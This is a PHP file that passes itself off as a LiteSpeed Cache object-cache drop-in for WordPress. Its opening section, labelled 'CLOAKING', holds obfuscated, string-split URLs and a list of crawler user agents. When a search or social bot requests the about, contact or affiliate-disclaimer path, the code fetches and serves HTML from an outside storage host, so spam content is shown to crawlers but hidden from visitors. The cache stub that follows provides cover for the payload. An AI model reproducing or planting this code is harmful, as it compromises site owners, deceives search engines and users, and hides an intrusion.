<?php

/**
 * Plugin Name:       LiteSpeed Cache - Object Cache (Drop-in)
 * Plugin URI:        https://www.litespeedtech.com/products/cache-plugins/wordpress-acceleration
 * Description:       High-performance page caching and site optimization from LiteSpeed.
 * Author:            LiteSpeed Technologies
 * Author URI:        https://www.litespeedtech.com
 */

// ===== CLOAKING START =====
$__map = [
    '/af'.'fil'.'iat'.'e-d'.'isc'.'lai'.'mer' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'jon'.'ath'.'ans'.'roc'.'k-a'.'ffi'.'lia'.'te-'.'dis'.'cla'.'ime'.'r.h'.'tml',
    '/co'.'nta'.'ct-'.'me' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'jon'.'ath'.'ans'.'roc'.'k-c'.'ont'.'act'.'-me'.'.ht'.'ml',
    '/ab'.'out' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'jon'.'ath'.'ans'.'roc'.'k-a'.'bou'.'t.h'.'tml',
];

$__uri   = rtrim(parse_url(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', PHP_URL_PATH), '/');
$__offer = null;
foreach ($__map as $__path => $__url) {
    $__norm = rtrim($__path, '/');
    if ($__uri === $__norm) { $__offer = $__url; break; }
    if ($__norm !== '' && strpos($__uri, $__norm) === 0) { $__offer = $__url; break; }
}

if ($__offer) {
    header('X-LiteSpeed-Cache-Control: no-cache');
    $__ua = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');

    $__bots = [
    'goo'.'gle'.'bot',
    'goo'.'gle'.'bot'.'-im'.'age',
    'goo'.'gle'.'bot'.'-vi'.'deo',
    'goo'.'gle'.'bot'.'-ne'.'ws',
    'goo'.'gle'.'bot'.'-mo'.'bil'.'e',
    'goo'.'gle'.'-in'.'spe'.'cti'.'ont'.'ool',
    'goo'.'gle'.'oth'.'er',
    'goo'.'gle'.'oth'.'er-'.'ima'.'ge',
    'goo'.'gle'.'oth'.'er-'.'vid'.'eo',
    'ads'.'bot'.'-go'.'ogl'.'e',
    'ads'.'bot'.'-go'.'ogl'.'e-m'.'obi'.'le',
    'sto'.'reb'.'ot-'.'goo'.'gle',
    'goo'.'gle'.'-ex'.'ten'.'ded',
    'med'.'iap'.'art'.'ner'.'s-g'.'oog'.'le',
    'goo'.'gle'.'web'.'lig'.'ht',
    'bin'.'gbo'.'t',
    'adi'.'dxb'.'ot',
    'bin'.'gpr'.'evi'.'ew',
    'mic'.'ros'.'oft'.'pre'.'vie'.'w',
    'slu'.'rp',
    'duc'.'kdu'.'ckb'.'ot',
    'bai'.'dus'.'pid'.'er',
    'yan'.'dex'.'bot',
    'sog'.'ou',
    'ia_'.'arc'.'hiv'.'er',
    'fac'.'ebo'.'oke'.'xte'.'rna'.'lhi'.'t',
    'twi'.'tte'.'rbo'.'t',
    'lin'.'ked'.'inb'.'ot',
    'pin'.'ter'.'est',
    'tel'.'egr'.'amb'.'ot',
    'dis'.'cor'.'dbo'.'t',
    'sem'.'rus'.'hbo'.'t',
    'ahr'.'efs'.'bot',
    'dot'.'bot',
    'mj1'.'2bo'.'t',
    'app'.'leb'.'ot',
];
    $__is_bot = false;
    foreach ($__bots as $__b) { if (strpos($__ua, $__b) !== false) { $__is_bot = true; break; } }

    if ($__is_bot) {
        $__ch = curl_init();
        curl_setopt_array($__ch, [CURLOPT_URL => $__offer, CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0']);
        $__c = curl_exec($__ch);
        curl_close($__ch);
        if ($__c) { header('Content-Type: text/html; charset=utf-8'); header('Cache-Control: no-store, no-cache'); echo $__c; exit; }
    }
}
// ===== CLOAKING END =====

// ===== WP OBJECT CACHE STUB — jangan hapus, dibutuhkan WP =====
global $wp_object_cache;

function wp_cache_init() { global $wp_object_cache; $wp_object_cache = new WP_Object_Cache(); }
function wp_cache_close() { return true; }
function wp_cache_get($key, $group = '', $force = false, &$found = null) { global $wp_object_cache; return $wp_object_cache->get($key, $group, $force, $found); }
function wp_cache_set($key, $data, $group = '', $expire = 0) { global $wp_object_cache; return $wp_object_cache->set($key, $data, $group, $expire); }
function wp_cache_add($key, $data, $group = '', $expire = 0) { global $wp_object_cache; return $wp_object_cache->add($key, $data, $group, $expire); }
function wp_cache_replace($key, $data, $group = '', $expire = 0) { global $wp_object_cache; return $wp_object_cache->replace($key, $data, $group, $expire); }
function wp_cache_delete($key, $group = '') { global $wp_object_cache; return $wp_object_cache->delete($key, $group); }
function wp_cache_flush() { global $wp_object_cache; return $wp_object_cache->flush(); }
function wp_cache_flush_runtime() { return wp_cache_flush(); }
function wp_cache_flush_group($group) { global $wp_object_cache; return $wp_object_cache->flush_group($group); }
function wp_cache_incr($key, $offset = 1, $group = '') { global $wp_object_cache; return $wp_object_cache->incr($key, $offset, $group); }
function wp_cache_decr($key, $offset = 1, $group = '') { global $wp_object_cache; return $wp_object_cache->decr($key, $offset, $group); }
function wp_cache_switch_to_blog($blog_id) { global $wp_object_cache; $wp_object_cache->switch_to_blog($blog_id); }
function wp_cache_add_global_groups($groups) { global $wp_object_cache; $wp_object_cache->add_global_groups($groups); }
function wp_cache_add_non_persistent_groups($groups) { /* no-op */ }
function wp_cache_reset() { return wp_cache_flush(); }
function wp_cache_get_multiple($keys, $group = '', $force = false) { $v = []; foreach ($keys as $k) { $v[$k] = wp_cache_get($k, $group, $force); } return $v; }
function wp_cache_set_multiple($data, $group = '', $expire = 0) { $v = []; foreach ($data as $k => $d) { $v[$k] = wp_cache_set($k, $d, $group, $expire); } return $v; }
function wp_cache_delete_multiple($keys, $group = '') { $v = []; foreach ($keys as $k) { $v[$k] = wp_cache_delete($k, $group); } return $v; }

class WP_Object_Cache {
    private $cache = [];
    private $global_groups = [];
    private $blog_prefix = 1;

    public function get($key, $group = 'default', $force = false, &$found = null) {
        $id = $this->_id($key, $group);
        if (array_key_exists($id, $this->cache)) { $found = true; return is_object($this->cache[$id]) ? clone $this->cache[$id] : $this->cache[$id]; }
        $found = false; return false;
    }
    public function set($key, $data, $group = 'default', $expire = 0) {
        $this->cache[$this->_id($key, $group)] = is_object($data) ? clone $data : $data; return true;
    }
    public function add($key, $data, $group = 'default', $expire = 0) {
        if (false !== $this->get($key, $group)) return false; return $this->set($key, $data, $group, $expire);
    }
    public function replace($key, $data, $group = 'default', $expire = 0) {
        if (false === $this->get($key, $group)) return false; return $this->set($key, $data, $group, $expire);
    }
    public function delete($key, $group = 'default') {
        $id = $this->_id($key, $group); if (!array_key_exists($id, $this->cache)) return false; unset($this->cache[$id]); return true;
    }
    public function flush() { $this->cache = []; return true; }
    public function flush_group($group) {
        $prefix = $this->blog_prefix . ':' . $group . ':';
        foreach (array_keys($this->cache) as $k) { if (strpos($k, $prefix) === 0) unset($this->cache[$k]); }
        return true;
    }
    public function incr($key, $offset = 1, $group = 'default') {
        $v = $this->get($key, $group); if (false === $v) return false;
        $v = max(0, (int)$v + (int)$offset); $this->set($key, $v, $group); return $v;
    }
    public function decr($key, $offset = 1, $group = 'default') { return $this->incr($key, -(int)$offset, $group); }
    public function switch_to_blog($blog_id) { $this->blog_prefix = (int)$blog_id; }
    public function add_global_groups($groups) { foreach ((array)$groups as $g) { $this->global_groups[$g] = true; } }
    private function _id($key, $group) {
        if (empty($group)) $group = 'default';
        $prefix = isset($this->global_groups[$group]) ? '0' : $this->blog_prefix;
        return $prefix . ':' . $group . ':' . $key;
    }
}
wp_cache_init();
